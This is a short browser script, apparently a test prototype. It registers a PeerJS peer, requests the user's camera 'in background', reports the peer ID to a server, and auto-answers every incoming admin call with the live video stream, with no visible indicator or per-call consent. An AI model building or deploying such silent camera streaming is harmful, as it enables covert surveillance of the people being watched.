document.addEventListener("DOMContentLoaded", function () {
    const roomId = "user_room_123"; 
    let userPeer = new Peer();

    userPeer.on("open", (id) => {
        console.log("User Connected with ID:", id);

        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then((stream) => {
                console.log("User camera running in background");

                fetch('/test/save-user.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ roomId, userPeerId: id })
                });

                userPeer.on("call", (call) => {
                    console.log("Incoming call from admin...");
                    call.answer(stream); 

                    call.on("stream", (adminStream) => {
                        console.log("Admin's stream received");
                       
                    });

                    call.on("error", (err) => {
                        console.error("Call error:", err);
                    });
                });
            })
            .catch((err) => {
                console.error("Camera access error:", err);
            });
    });

    userPeer.on("error", (err) => {
        console.error("PeerJS error:", err);
    });
});
